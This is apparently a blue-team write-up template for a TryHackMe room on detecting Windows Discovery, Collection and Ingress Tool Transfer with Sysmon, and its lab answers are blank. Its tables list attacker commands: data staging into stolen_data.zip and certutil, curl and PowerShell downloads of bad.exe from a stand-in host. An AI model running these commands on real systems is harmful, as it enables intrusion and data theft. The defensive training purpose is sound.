---
title: "Windows Threat Detection 2"
module: "Windows Security Monitoring"
path: "SOC Level 1"
platform: "TryHackMe"
tags: [windows, sysmon, discovery, collection, exfiltration, ingress-tool-transfer, MITRE, event-logs]
status: in-progress
date: 2026-06-22
date_completed:
---

*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*

---

## Task 1 - Introduction

**1.** Let's start!

**Answer:** N/A

---

## Task 2 - Discovery Overview

<!-- 
KEY CONCEPTS
- What MITRE tactic does post-access environment enumeration map to?
- What categories of information do Discovery commands target?
- What is the difference between CMD-based and GUI-based Discovery?
- Which Sysmon Event ID tracks process creation?
-->

| Discovery Purpose | Common CMD / PowerShell Commands |
|---|---|
| Files and Folders | `type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>` |
| Users and Groups | `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser` |
| System and Apps | `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service` |
| Network Settings | `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles` |
| Active Antivirus | `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"` |

**1.** Open CMD and type "net user Administrator". Which privileged group does the user belong to?

**Answer:**

**2.** Open Event Viewer and try to find your command in Sysmon logs. What is the "Image" field of the net command you just run?

**Answer:**

---

## Task 3 - Detecting Discovery

<!-- 
KEY CONCEPTS
- How do you correlate Sysmon fields to reconstruct a process tree?
- What Sysmon event ID logs process creation?
- What fields link a child process to its parent?
- How would you distinguish legitimate IT commands from attacker Discovery?
-->

**1.** Looking at Sysmon logs, what is the first command the invoice.pdf.exe executes?

**Answer:**

**2.** Which command did the malware use to check the presence of MS Defender EDR?

**Answer:**

**3.** To which domain did the malware send the discovered data?

**Answer:**

---

## Task 4 - Collection Overview

<!-- 
KEY CONCEPTS
- What three MITRE tactics cover the data theft phase?
- What are common file system paths targeted for credential theft?
- What techniques do threat actors use to avoid detection during exfiltration?
- Why do attackers exfiltrate to trusted cloud services like Dropbox or GitHub?
-->

**1.** What is the Facebook password that the user saved in Chrome?

**Answer:**

**2.** Which interesting SSH key does the user store on disk?

**Answer:**

**3.** What is the secret PDF file explaining TryHackMe's internal network?

**Answer:**

---

## Task 5 - Detecting Collection

<!-- 
KEY CONCEPTS
- What Sysmon event ID is used to detect file access during Collection?
- How do data stealers differ from manual collection in terms of detection?
- What PowerShell cmdlet retrieves clipboard content?
- Why are data stealers harder to detect than manual threat actor activity?
-->

| Command Example | Description |
|---|---|
| `notepad.exe C:\Users\<user>\Desktop\finances-2025.csv` | Threat actor used Notepad to read a file of interest |
| `type debug-logs.txt \| findstr password > C:\Temp\passwords.txt` | Searched for keyword in file and redirected output |
| `Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf` | Recursively searched for PDF files in user directory |
| `copy C:\Users\<user>\AppData\Roaming\Signal C:\Temp\` | Copied Signal chat history to staging directory |
| `Compress-Archive C:\Temp\ C:\Temp\stolen_data.zip` | Archived staged data in preparation for exfiltration |
| `7za.exe a -tzip C:\Temp\stolen_data.zip C:\Temp\*.*` | Same as above using 7-Zip instead of native PowerShell |

**1.** Looking at Sysmon logs, what directory does the stealer create?

**Answer:**

**2.** Which three file extensions does the malware search for?

**Answer:**

**3.** Which PowerShell cmdlet does the malware use to get clipboard content?

**Answer:**

**4.** Which domain does the malware exfiltrate the data to?

**Answer:**

---

## Task 6 - Ingress Tool Transfer

<!-- 
KEY CONCEPTS
- What is the MITRE technique for downloading tools to a compromised host?
- Why do threat actors stage attacks in multiple parts instead of one payload?
- Which Windows native binaries can be used for file download (living off the land)?
- What log sources best detect Ingress Tool Transfer?
-->

| Ingress Tool Transfer Method | Command |
|---|---|
| Via Certutil | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe` |
| Via Curl (Windows 10+) | `curl.exe https://blackhat.thm/bad.exe -o good.exe` |
| Via PowerShell IWR | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"` |
| Via Graphical Interface | No CMD needed; copy-paste via RDP or download through browser |

**1.** Open the Chrome browser on the VM and navigate to the URL. What is the flag in the response?

**Answer:**

**2.** Download the file from the same URL using curl.exe. What is the flag in the response?

**Answer:**

**3.** Download using certutil.exe. What is the flag in the response?

**Answer:**

**4.** Download the same file using PowerShell IWR. What is the flag in the response?

**Answer:**

---

## Task 7 - Conclusion

**1.** I am ready to continue the journey!

**Answer:** N/A
